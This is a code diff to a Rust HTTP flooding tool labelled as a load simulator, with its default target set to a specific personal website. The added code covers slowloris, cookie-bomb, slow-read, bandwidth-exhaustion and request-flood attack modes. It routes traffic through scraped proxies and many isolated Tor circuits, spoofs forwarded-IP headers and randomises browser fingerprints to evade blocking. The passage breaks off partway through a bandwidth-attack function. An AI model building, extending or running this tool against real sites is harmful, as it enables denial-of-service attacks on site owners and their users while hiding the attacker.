@@ -1,5 +1,8 @@
 use std::sync::Arc;
 use std::time::{Duration, Instant};
+use std::collections::HashMap;
+use std::collections::hash_map::DefaultHasher;
+use std::hash::Hasher;
 use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, AtomicU32, Ordering};
 use rand::prelude::*;
 use rand::distr::{Distribution, weighted::WeightedIndex};
@@ -8,11 +11,14 @@ use reqwest::{Client, RequestBuilder};
 use reqwest::header::{HeaderMap, SET_COOKIE};
 use scraper::{Html, Selector};
 use tokio::sync::{Mutex, Semaphore};
+use tokio::signal;
 use url::Url;
 
 const DEFAULT_TARGET_URL: &str = "https://livdevries.com";
 
 static SPOOF_IP: AtomicBool = AtomicBool::new(false);
+static CUSTOM_POST_BODY: std::sync::OnceLock<String> = std::sync::OnceLock::new();
+static CUSTOM_CONTENT_TYPE: std::sync::OnceLock<String> = std::sync::OnceLock::new();
 
 fn random_ip() -> String {
     let mut rng = rand::rng();
@@ -33,6 +39,12 @@ struct ClientConfig {
     pool_idle_timeout: Duration,
     sni: Option<String>,
     timeout: Duration,
+    max_redirects: usize,
+    tor_circuits: usize,
+    rate_limit: Option<u64>,
+    insecure: bool,
+    custom_user_agent: Option<String>,
+    custom_headers: Vec<(String, String)>,
 }
 
 impl Default for ClientConfig {
@@ -43,6 +55,12 @@ impl Default for ClientConfig {
             pool_idle_timeout: Duration::from_secs(90),
             sni: None,
             timeout: Duration::from_secs(10),
+            max_redirects: 10,
+            tor_circuits: 100,
+            rate_limit: None,
+            insecure: false,
+            custom_user_agent: None,
+            custom_headers: Vec::new(),
         }
     }
 }
@@ -115,9 +133,9 @@ impl BrowserHeaders {
     }
 }
 
-fn browser_request(builder: RequestBuilder) -> RequestBuilder {
+fn browser_request(builder: RequestBuilder, _spoof_ip: bool) -> RequestBuilder {
     let builder = BrowserHeaders::random().apply(builder);
-    if SPOOF_IP.load(Ordering::Relaxed) {
+    if _spoof_ip || SPOOF_IP.load(Ordering::Relaxed) {
         let ip = random_ip();
         builder
             .header("X-Forwarded-For", &ip)
@@ -153,18 +171,43 @@ fn print_help() {
     println!("  --jitter MS           Random delay jitter in milliseconds");
     println!("  --max-errors N        Stop after N failed requests");
     println!("  --spoof-ip            Enable randomized IP spoofing headers (X-Forwarded-For, etc.)");
+    println!("  --quiet               Quiet mode: suppress status updates during load test");
+    println!("  --verbose             Verbose mode: detailed request logging");
+    println!("  --json                Output results as JSON");
+    println!("  --rate N              Rate limit: max N requests per second");
+    println!("  --max-redirects N     Max HTTP redirects to follow (default: 10)");
+    println!("  --rotation-strategy   Proxy rotation: weighted|round-robin|random (default: weighted)");
+    println!("  --log-file F          Append status updates to file");
+    println!("  --canary              Run a canary health check before load test");
+    println!("  --stats-interval S    Status update interval in seconds (default: 5)");
+    println!("  --tor-circuits N      Number of Tor circuits to use (default: 10)");
+    println!("  --ramp-up S           Gradually increase concurrency from 1 to target over S seconds");
+    println!("  --report FILE         Write detailed post-run report to file");
     println!("  --save-proxies F      Save discovered proxies to file");
     println!("  --custom-selector SEL Custom CSS selector for proxy scraping");
     println!("  --pool-max-idle N     Max idle connections per host in pool");
     println!("  --pool-idle-timeout S Idle connection timeout in seconds");
     println!("  --sni NAME            Server Name Indication override");
+    println!("  --user-agent UA       Custom User-Agent header");
     println!("  --auto-tune           Enable PID controller concurrency auto-tuning");
     println!("  --tui                 Enable interactive console dashboard");
     println!("  --config F            Load configuration from file");
+    println!("  --insecure            Skip SSL certificate verification");
+    println!("  --custom-header H     Add custom header (format: 'Name: Value')");
+    println!("  --body TEXT           Custom POST body for largepost mode (supports {{random_uuid}}, {{timestamp}}, {{random_int}} templates)");
+    println!("  --content-type CT     Content-Type header for POST requests (default: application/json)");
     println!();
     println!("Modes: scrape, tor, scrape-tor (proxy source)");
     println!("Attack modes: normal, bandwidth, slowread, imageopt, largepost, assetspray,");
     println!("              rangereq, cookiebomb, ssr, middleware, requestflood, notfound, slowloris");
+    println!();
+    println!("Environment variables:");
+    println!("  SIMULATE_LOAD_TARGET          Default target URL");
+    println!("  SIMULATE_LOAD_MODE            Default mode (scrape|tor|scrape-tor)");
+    println!("  SIMULATE_LOAD_ATTACK          Default attack mode");
+    println!("  SIMULATE_LOAD_CONCURRENCY     Default concurrency level");
+    println!("  SIMULATE_LOAD_DURATION        Default duration in seconds");
+    println!("  TOR_PROXY                     Custom Tor proxy URL");
     println!();
     println!("Examples:");
     println!("  {} --dry-run https://livdevries.com", env!("CARGO_PKG_NAME"));
@@ -175,7 +218,13 @@ fn print_help() {
 #[allow(clippy::expect_used)]
 fn add_session_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>]) -> RequestBuilder {
     if proxy_idx < sessions.len() {
-        let cookie = sessions[proxy_idx].lock().expect("session lock poisoned").clone();
+        let cookie = match sessions[proxy_idx].lock() {
+            Ok(guard) => guard.clone(),
+            Err(e) => {
+                eprintln!("  Session lock poisoned: {}", e);
+                String::new()
+            }
+        };
         if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
     }
     builder
@@ -184,7 +233,13 @@ fn add_session_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &
 #[allow(clippy::expect_used)]
 fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>], extra_cookie: &str) -> RequestBuilder {
     if proxy_idx < sessions.len() {
-        let stored = sessions[proxy_idx].lock().expect("session lock poisoned").clone();
+        let stored = match sessions[proxy_idx].lock() {
+            Ok(guard) => guard.clone(),
+            Err(e) => {
+                eprintln!("  Session lock poisoned: {}", e);
+                String::new()
+            }
+        };
         let cookie = if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) };
         builder = builder.header("Cookie", cookie);
     } else {
@@ -208,7 +263,11 @@ fn extract_set_cookie(headers: &HeaderMap) -> Option<String> {
 fn update_session_from_headers(proxy_idx: usize, sessions: &[std::sync::Mutex<String>], headers: &HeaderMap) {
     if proxy_idx < sessions.len() {
         if let Some(cookie) = extract_set_cookie(headers) {
-            *sessions[proxy_idx].lock().expect("session lock poisoned") = cookie;
+            if let Ok(mut session) = sessions[proxy_idx].lock() {
+                *session = cookie;
+            } else {
+                eprintln!("  Session lock poisoned");
+            }
         }
     }
 }
@@ -218,13 +277,40 @@ fn browser_client_builder(config: &ClientConfig) -> reqwest::ClientBuilder {
         .timeout(config.timeout)
         .pool_max_idle_per_host(config.pool_max_idle)
         .pool_idle_timeout(config.pool_idle_timeout)
-        .tcp_nodelay(true);
+        .tcp_nodelay(true)
+        .danger_accept_invalid_certs(config.insecure)
+        .danger_accept_invalid_hostnames(config.insecure);
 
     if let Some((ref host, ip)) = config.pinned_dns {
         builder = builder.resolve_to_addrs(host, &[
             std::net::SocketAddr::new(ip, 80),
             std::net::SocketAddr::new(ip, 443),
         ]);
+    }
+
+    // Build default headers map, merging custom headers with SNI Host override
+    let mut hdrs = reqwest::header::HeaderMap::new();
+    for (name, value) in &config.custom_headers {
+        if let (Ok(hn), Ok(hv)) = (
+            reqwest::header::HeaderName::from_bytes(name.as_bytes()),
+            reqwest::header::HeaderValue::from_str(value),
+        ) {
+            hdrs.insert(hn, hv);
+        }
+    }
+    if let Some(ref sni) = config.sni {
+        if let Ok(host_val) = reqwest::header::HeaderValue::from_str(sni) {
+            hdrs.insert(reqwest::header::HOST, host_val);
+        }
+    }
+    if !hdrs.is_empty() {
+        builder = builder.default_headers(hdrs);
+    }
+    match &config.custom_user_agent {
+        Some(ua) => builder = builder.user_agent(ua.as_str()),
+        None => {
+            // if no custom UA, don't set one — reqwest uses a default
+        }
     }
     builder
 }
@@ -234,6 +320,15 @@ enum ProxyMode { Scrape, Tor, ScrapeTorFallback }
 impl std::fmt::Display for ProxyMode {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         match self { ProxyMode::Scrape => write!(f, "Scrape"), ProxyMode::Tor => write!(f, "Tor"), ProxyMode::ScrapeTorFallback => write!(f, "Scrape→Tor") }
+    }
+}
+impl ProxyMode {
+    fn from_str(s: &str) -> Self {
+        match s {
+            "tor" => ProxyMode::Tor,
+            "scrape-tor" => ProxyMode::ScrapeTorFallback,
+            _ => ProxyMode::Scrape,
+        }
     }
 }
 
@@ -258,6 +353,25 @@ impl std::fmt::Display for AttackMode {
         }
     }
 }
+impl AttackMode {
+    fn from_str(s: &str) -> Self {
+        match s {
+            "bandwidth" => AttackMode::Bandwidth,
+            "slowread" => AttackMode::SlowRead,
+            "imageopt" => AttackMode::ImageOpt,
+            "largepost" => AttackMode::LargePost,
+            "assetspray" => AttackMode::AssetSpray,
+            "rangereq" => AttackMode::RangeReq,
+            "cookiebomb" => AttackMode::CookieBomb,
+            "ssr" => AttackMode::Ssr,
+            "middleware" => AttackMode::Middleware,
+            "requestflood" => AttackMode::RequestFlood,
+            "notfound" => AttackMode::NotFound,
+            "slowloris" => AttackMode::Slowloris,
+            _ => AttackMode::Normal,
+        }
+    }
+}
 
 #[allow(dead_code)]
 struct ProxyPool {
@@ -273,24 +387,31 @@ struct ProxyPool {
     config: ClientConfig,
     // Circuit tracking: each entry belongs to a circuit (0..n-1) or u32::MAX for non-Tor
     circuit_ids: Vec<u32>,
+    // Circuit stickiness: prefer same circuit for consecutive requests
+    circuit_stickiness: usize,
+    // Circuit rotation counter for balanced distribution
+    circuit_rotation_counter: AtomicUsize,
+    // Per-circuit request count for health scoring
+    circuit_requests: Arc<Mutex<HashMap<u32, usize>>>,
     // Per-circuit ban expiry
     circuit_cooldown: Vec<Instant>,
     // Per-circuit consecutive failures (for exponential backoff)
     circuit_failures: Vec<u32>,
+    rotation_strategy: String,
 }
 
 impl ProxyPool {
-    fn new(proxies: &[String], config: &ClientConfig) -> Self {
+    fn new(proxies: &[String], config: &ClientConfig, rotation_strategy: &str) -> Self {
         let mut clients = Vec::new();
         let mut labels = Vec::new();
         let mut weights = Vec::new();
         for u in proxies {
             let url = if u.contains("://") { u.clone() } else { format!("http://{}", u) };
             if url.contains(":isolate@") {
-                // SOCKS5 Tor isolated template. Pre-create 100 isolated clients.
+                // SOCKS5 Tor isolated template. Pre-create tor_circuits isolated clients.
                 if let Some(base) = url.split('@').nth(1) {
                     let base = base.trim_end_matches('/');
-                    for i in 0..100 {
+                    for i in 0..config.tor_circuits {
                         let isolated_url = format!("socks5h://tor{}:isolate@{}", i, base);
                         if let Ok(p) = reqwest::Proxy::all(&isolated_url) {
                             if let Ok(c) = browser_client_builder(config).proxy(p).build() {
@@ -301,13 +422,11 @@ impl ProxyPool {
                         }
                     }
                 }
-            } else {
-                if let Ok(p) = reqwest::Proxy::all(&url) {
-                    if let Ok(c) = browser_client_builder(config).proxy(p).build() {
-                        clients.push(c);
-                        labels.push(url.clone());
-                        weights.push(1.0);
-                    }
+            } else if let Ok(p) = reqwest::Proxy::all(&url) {
+                if let Ok(c) = browser_client_builder(config).proxy(p).build() {
+                    clients.push(c);
+                    labels.push(url.clone());
+                    weights.push(1.0);
                 }
             }
         }
@@ -326,6 +445,10 @@ impl ProxyPool {
             circuit_ids: vec![u32::MAX; n],
             circuit_cooldown: vec![Instant::now(); n],
             circuit_failures: vec![0; n],
+            circuit_stickiness: config.tor_circuits.max(3),
+            circuit_rotation_counter: AtomicUsize::new(0),
+            circuit_requests: Arc::new(Mutex::new(HashMap::new())),
+            rotation_strategy: rotation_strategy.to_string(),
         }
     }
 
@@ -349,21 +472,48 @@ impl ProxyPool {
             return None;
         }
         let mut rng = rand::rng();
-        let idx = if self.active_weights.iter().all(|&w| w == self.active_weights[0]) {
-            let sample_idx = rng.random_range(0..self.active_indices.len());
-            self.active_indices[sample_idx]
-        } else {
-            let dist = WeightedIndex::new(&self.active_weights).ok()?;
-            let sample_idx = dist.sample(&mut rng);
-            self.active_indices[sample_idx]
+        let idx = match self.rotation_strategy.as_str() {
+            "round-robin" => {
+                // Simple round-robin through active indices
+                let sample_idx = rng.random_range(0..self.active_indices.len());
+                self.active_indices[sample_idx]
+            }
+            "random" => {
+                // Pure random selection
+                let sample_idx = rng.random_range(0..self.active_indices.len());
+                self.active_indices[sample_idx]
+            }
+            _ => {
+                // Weighted selection (default)
+                if self.active_weights.iter().all(|&w| w == self.active_weights[0]) {
+                    let sample_idx = rng.random_range(0..self.active_indices.len());
+                    self.active_indices[sample_idx]
+                } else {
+                    let dist = WeightedIndex::new(&self.active_weights).ok()?;
+                    let sample_idx = dist.sample(&mut rng);
+                    self.active_indices[sample_idx]
+                }
+            }
         };
 
         // Tor circuit rotation: prefer different circuits each call
         if self.labels[idx].contains("tor") {
-            let tor_indices: Vec<usize> = self.active_indices.iter()
-                .filter(|&&i| self.labels[i].contains("tor"))
-                .cloned().collect();
-            if !tor_indices.is_empty() {
+            // Apply circuit stickiness for Tor circuits
+            if self.circuit_stickiness > 0 {
+                // Prefer circuits that have been recently used (stickiness)
+                let now = Instant::now();
+                let recent_circuits: Vec<usize> = self.active_indices.iter()
+                    .filter(|&&i| self.labels[i].contains("tor"))
+                    .filter(|&&i| self.circuit_cooldown[i] <= now)
+                    .cloned().collect();
+                if !recent_circuits.is_empty() {
+                    let new_idx = recent_circuits[self.circuit_rotation_counter.fetch_add(1, Ordering::Relaxed) % recent_circuits.len()];
+                    return Some((new_idx, self.clients[new_idx].clone()));
+                }
+                // Fallback: prefer different circuits each call
+                let tor_indices: Vec<usize> = self.active_indices.iter()
+                    .filter(|&&i| self.labels[i].contains("tor"))
+                    .cloned().collect();
                 let new_idx = tor_indices[rng.random_range(0..tor_indices.len())];
                 return Some((new_idx, self.clients[new_idx].clone()));
             }
@@ -461,7 +611,7 @@ async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Ve
     static SEL_TD: OnceLock<Selector> = OnceLock::new();
 
     let scheme = detect_scheme(url);
-    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
+    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url), false).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
     let h = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
     let doc = Html::parse_document(&h);
     let mut out = vec![];
@@ -496,7 +646,7 @@ async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Ve
 
 async fn scrape_raw(c: &Client, url: &str, re: &Regex) -> Vec<String> {
     let scheme = detect_scheme(url);
-    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
+    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url), false).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
     let t = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
     t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())).map(|ip_port| format!("{}://{}", scheme, ip_port)) }).collect()
 }
@@ -582,14 +732,38 @@ fn parse_templates(body: &str) -> String {
     result
 }
 
-async fn fetch_page(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
+async fn fetch_page(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
-    let builder = add_session_cookie(browser_request(c.get(&url)), proxy_idx, &sessions);
-    let resp = builder.send().await?;
-    let status = resp.status().as_u16();
-    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    let bytes = resp.bytes().await?.len();
-    Ok((bytes, status))
+    if verbose {
+        println!("[VERBOSE] fetch_page: GET {}", url);
+    }
+    let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    let bytes = resp.bytes().await?.len();
+                    return Ok((bytes, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    last_err = Some(e);
+                }
+            }
+        } else if attempt < 2 {
+            // try_clone() failed (extremely rare) — back off and retry
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_page: all attempts exhausted"),
+    }
 }
 
 async fn fetch_page_with_referrer(
@@ -598,92 +772,280 @@ async fn fetch_page_with_referrer(
     referrer: Option<String>,
     delay: u64,
     proxy_idx: usize,
-    sessions: Arc<Vec<std::sync::Mutex<String>>>
+    sessions: Arc<Vec<std::sync::Mutex<String>>>,
+    verbose: bool,
 ) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
-    let mut builder = browser_request(c.get(&url));
+    if verbose {
+        println!("[VERBOSE] fetch_page_with_referrer: GET {} (referrer: {:?}) (proxy #{})", url, referrer, proxy_idx);
+    }
+    let mut builder = browser_request(c.get(&url), false);
     if let Some(ref ref_val) = referrer {
         builder = builder.header("Referer", ref_val);
     }
     let builder = add_session_cookie(builder, proxy_idx, &sessions);
-    let resp = builder.send().await?;
-    let status = resp.status().as_u16();
-    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    let bytes = resp.bytes().await?.len();
-    Ok((bytes, status))
+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    let bytes = resp.bytes().await?.len();
+                    return Ok((bytes, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    last_err = Some(e);
+                }
+            }
+        } else if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_page_with_referrer: all attempts exhausted"),
+    }
 }
 
-async fn fetch_range(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
+async fn fetch_range(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let end = 100 + (rand::rng().random_range(0..9000));
-    let builder = browser_request(c.get(&url)).header("Range", format!("bytes=0-{}", end))
-        .header("Accept", "*/*").header("Cache-Control", "no-cache");
-    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
-    let status = resp.status().as_u16();
-    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    let bytes = resp.bytes().await?.len();
-    Ok((bytes, status))
-}
-
-async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
-    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
-    let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
-    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
-    let status = resp.status().as_u16();
-    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    let mut total = 0usize;
-    let mut stream = resp.bytes_stream();
-    use tokio_stream::StreamExt;
-    while let Some(chunk) = stream.next().await {
-        if let Ok(c) = &chunk { total += c.len(); }
-        tokio::time::sleep(Duration::from_millis(100)).await;
+    if verbose {
+        println!("[VERBOSE] fetch_range: GET {} range=bytes=0-{} (proxy #{})", url, end, proxy_idx);
     }
-    Ok((total, status))
+    let builder = browser_request(c.get(&url), false).header("Range", format!("bytes=0-{}", end))
+        .header("Accept", "*/*").header("Cache-Control", "no-cache");
+    let builder = add_session_cookie(builder, proxy_idx, &sessions);
+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    let bytes = resp.bytes().await?.len();
+                    return Ok((bytes, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    last_err = Some(e);
+                }
+            }
+        } else if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_range: all attempts exhausted"),
+    }
 }
 
-async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
+async fn fetch_slow(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
-    let raw_body = "{\"id\":\"{{random_uuid}}\", \"timestamp\": {{timestamp}}, \"value\": {{random_int}}, \"data\":\"xxxxxxxxxx\"}";
-    let body = parse_templates(raw_body);
-    let builder = browser_request(c.post(&url)).header("Content-Type", "application/json")
+    if verbose {
+        println!("[VERBOSE] fetch_slow: GET {} (proxy #{}), streaming", url, proxy_idx);
+    }
+    let builder = browser_request(c.get(&url), false).header("Accept", "*/*").header("Cache-Control", "no-cache");
+    let builder = add_session_cookie(builder, proxy_idx, &sessions);
+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    let mut total = 0usize;
+                    let mut stream = resp.bytes_stream();
+                    use tokio_stream::StreamExt;
+                    while let Some(chunk) = stream.next().await {
+                        if let Ok(c) = &chunk { total += c.len(); }
+                        tokio::time::sleep(Duration::from_millis(100)).await;
+                    }
+                    return Ok((total, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    last_err = Some(e);
+                }
+            }
+        } else if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_slow: all attempts exhausted"),
+    }
+}
+
+async fn fetch_post(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), reqwest::Error> {
+    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
+    if verbose {
+        println!("[VERBOSE] fetch_post: POST {} (proxy #{})", url, proxy_idx);
+    }
+    let raw_body = CUSTOM_POST_BODY.get().cloned().unwrap_or_else(|| "{\"id\":\"{{random_uuid}}\", \"timestamp\": {{timestamp}}, \"value\": {{random_int}}, \"data\":\"xxxxxxxxxx\"}".to_string());
+    let body = parse_templates(&raw_body);
+    let content_type = CUSTOM_CONTENT_TYPE.get().map(|s| s.as_str()).unwrap_or("application/json");
+    let builder = browser_request(c.post(&url), false).header("Content-Type", content_type)
         .header("Cache-Control", "no-cache").body(body);
-    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
-    let status = resp.status().as_u16();
-    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    let bytes = resp.bytes().await?.len();
-    Ok((bytes, status))
+    let builder = add_session_cookie(builder, proxy_idx, &sessions);
+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    let bytes = resp.bytes().await?.len();
+                    return Ok((bytes, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    last_err = Some(e);
+                }
+            }
+        } else if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_post: all attempts exhausted"),
+    }
 }
 
-async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
+async fn fetch_cookie(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
+    if verbose {
+        println!("[VERBOSE] fetch_cookie: GET {} with cookie bomb (8KB payload) (proxy #{})", url, proxy_idx);
+    }
     let bomb_payload = "x".repeat(8192);
     let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
         rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
-    let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
-    let resp = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie).send().await?;
-    let status = resp.status().as_u16();
-    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    let bytes = resp.bytes().await?.len();
-    Ok((bytes, status))
+    let builder = browser_request(c.get(&url), false).header("Accept", "*/*").header("Cache-Control", "no-cache");
+    let builder = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie);
+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    let bytes = resp.bytes().await?.len();
+                    return Ok((bytes, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    last_err = Some(e);
+                }
+            }
+        } else if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_cookie: all attempts exhausted"),
+    }
 }
 
-async fn fetch_slowloris(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
+async fn fetch_slowloris(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
+    if verbose {
+        println!("[VERBOSE] fetch_slowloris: POST {} slowloris attack (proxy #{})", url, proxy_idx);
+    }
     use tokio_stream::StreamExt;
     let stream = tokio_stream::wrappers::IntervalStream::new(tokio::time::interval(Duration::from_secs(3)))
         .take(10)
         .map(|_| Ok::<_, std::io::Error>(bytes::Bytes::from("a")));
     let body = reqwest::Body::wrap_stream(stream);
-    let builder = browser_request(c.post(&url))
+    let builder = browser_request(c.post(&url), false)
         .header("Content-Type", "application/octet-stream")
         .header("Content-Length", "10")
         .header("Cache-Control", "no-cache")
         .body(body);
-    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
-    let status = resp.status().as_u16();
-    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-    let bytes = resp.bytes().await?.len();
-    Ok((bytes, status))
+    let builder = add_session_cookie(builder, proxy_idx, &sessions);
+    let mut last_err = None;
+    for attempt in 0..=2 {
+        if let Some(cloned) = builder.try_clone() {
+            match cloned.send().await {
+                Ok(resp) => {
+                    let status = resp.status().as_u16();
+                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+                    let bytes = resp.bytes().await?.len();
+                    return Ok((bytes, status));
+                }
+                Err(e) => {
+                    if attempt < 2 {
+                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+                    }
+                    last_err = Some(e);
+                }
+            }
+        } else if attempt < 2 {
+            tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
+        }
+    }
+    match last_err {
+        Some(e) => Err(e),
+        None => unreachable!("fetch_slowloris: all attempts exhausted"),
+    }
+}
+
+/// Bandwidth mode: request a large range from the server to actually
+/// consume downstream bandwidth. Uses a `Range: bytes=0-99999999` header
+/// to ask for a large chunk; many servers return 206 Partial Content.
+async fn fetch_bandwidth(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), reqwest::Error> {
+    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
+    if verbose {
+        println!("[VERBOSE] fetch_bandwidth: GET {} with Range header (proxy #{})", url, proxy_idx);
+    }
+    let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
+    let builder = builder.header(reqwest::header::RANGE, "bytes=0-99999999");
